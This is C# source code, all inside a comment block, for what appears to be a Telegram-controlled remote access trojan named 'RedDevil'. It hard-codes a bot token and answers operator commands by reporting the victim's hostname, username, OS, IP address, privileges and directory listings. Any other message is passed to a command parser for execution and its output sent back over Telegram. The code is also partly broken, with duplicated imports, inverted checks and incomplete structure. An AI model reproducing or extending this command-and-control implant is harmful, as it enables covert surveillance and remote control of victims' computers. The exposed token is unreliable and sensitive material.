
/** using System;
using System;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace RedDevil
{
    class TelegramV
    {

        static TelegramBotClient Bot = new TelegramBotClient("6218224035:AAEq1c4lPLtggQ7jYolRvfXsYKpA1Zw6QvQ");

    }
} 
using Newtonsoft.Json;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using System.Net;
using System.Net.Http;
using Telegram.Bot.Types.ReplyMarkups;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;  

// struct to hold varaibles
        public static string text;
        public static long chatId;
        public static string username;

        // variable to old bot token
        static TelegramBotClient Bot = new TelegramBotClient("6218224035:AAEq1c4lPLtggQ7jYolRvfXsYKpA1Zw6QvQ");
        static string fileName = "updates.json";


        public static void Main(string[] args)
        {
            
            

            using CancellationTokenSource cts = new();

            

            // Bot StartReceiving, does not block the caller thread. Receiving is done on the ThreadPool.
            ReceiverOptions receiverOptions = new ()
            {
                AllowedUpdates = Array.Empty<UpdateType>() // receive all update types
            };

            Bot.StartReceiving(
                updateHandler: HandleUpdateAsync,
                pollingErrorHandler: HandlePollingErrorAsync,
                receiverOptions: receiverOptions,
                cancellationToken: cts.Token
            );

            // var me = await Bot.GetMeAsync();
            Console.WriteLine($"Start listening");
            Console.ReadLine();


            cts.Cancel();
            

            // Object of our class
            GeneralInfo infoObj = new GeneralInfo();
            Persistence parseOgj = new Persistence(infoObj);
            Operations opObj = new Operations(infoObj);
            // opObj.CommandParser("ls");
            opObj.DownloadFile("{}");
            //string list = opObj.CommandParser("ls");

        }


            static async Task HandleUpdateAsync(ITelegramBotClient bot, Update update, CancellationToken cancellationToken)
            {
                GeneralInfo infoObj = new GeneralInfo();
                Persistence parseOgj = new Persistence(infoObj);
                Operations opObj = new Operations(infoObj);
                // Only process Message updates: https://core.telegram.org/bots/api#message
                if(update.Type == UpdateType.Message)
                    return;
                
                // Only process text messages
                if(update.Message.Type == MessageType.Text)
                    return;


                
                    text = update.Message.Text;
                    chatId = update.Message.Chat.Id;
                    username = update.Message.Chat.Username;

                    string[] words = text.Split(" ");


                if( text=="/hostname"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("hostname"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken
                );
                }
                else if( text == "/help"){
                    Message message = await bot.SendTextMessageAsync(
                        chatId: chatId,
                        text: "to run the bot, use the following commands\n" + "/hostname - Get the Host Name\n" + " /cd - Set Working Directory eg cd /home/love/mark\n" + "/ls - Enumerate Current working directory\n" + "/username - Get Username\n" + "/osinfo - Get operating system info\n" + "/ipaddress - Get machine ip address\n" + "/processname - Get Process Name\n" + "/pwd - Print Current Directory\n" + "/privileges - Know users privileges\n" + "/exepath - Get executable Path",
                        cancellationToken: cancellationToken
                    );
                }
                else if( text == "/cd"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("cd") + " " + opObj.CommandParser(words[2]),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                }
                else if( text == "/ls"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("ls"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                }
                else if( text == "/username"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("username"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                }
                else if( text == "/osinfo"){
                    // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("osinfo") + "",
                    
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken
                );
                }
                else if( text == "/ipaddress"){
                    // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("ipaddress"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken
                );
                }
                else if( text == "/processname"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("processname"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                }
                else if( text == "/pwd"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("pwd"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                }
                else if( text == "/privileges"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("privileges"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                }
                else if( text == "/exepath"){
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser("exepath"),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                }
                else {
                // Echo received message text
                Message message = await bot.SendTextMessageAsync(
                    chatId: chatId,
                    text: opObj.CommandParser(text),
                    //replyMarkup: replyKeyboardMarkup,
                    cancellationToken: cancellationToken);
                } 
                

                
                /* {
                    if(update.Message.Type == MessageType.Text)
                    {
                        text = messageText.ToLower();
                        //write an update
                        var _botUpdate = new BotUpdate
                        {
                            text = update.Message.Text,
                            chatId = update.Message.Chat.Id,
                            username = update.Message.Chat.Username,
                        };

                        botUpdates.Add(_botUpdate);

                        var botUpdatesString = JsonConvert.SerializeObject(botUpdates);

                        System.IO.File.WriteAllText(fileName, botUpdatesString);

                        if (text == "/download")
                            {
                                // Echo received message text
                                Message message = await bot.SendTextMessageAsync(
                                chatId: chatId,
                                text: " ",
                                //replyMarkup: replyKeyboardMarkup,
                                cancellationToken: cancellationToken);
                            }
                    }
                } 
            }

            static async Task HandlePollingErrorAsync(ITelegramBotClient arg1, Exception arg2, CancellationToken cancellationToken)
            {
                throw new NotImplementedException();
            } ****/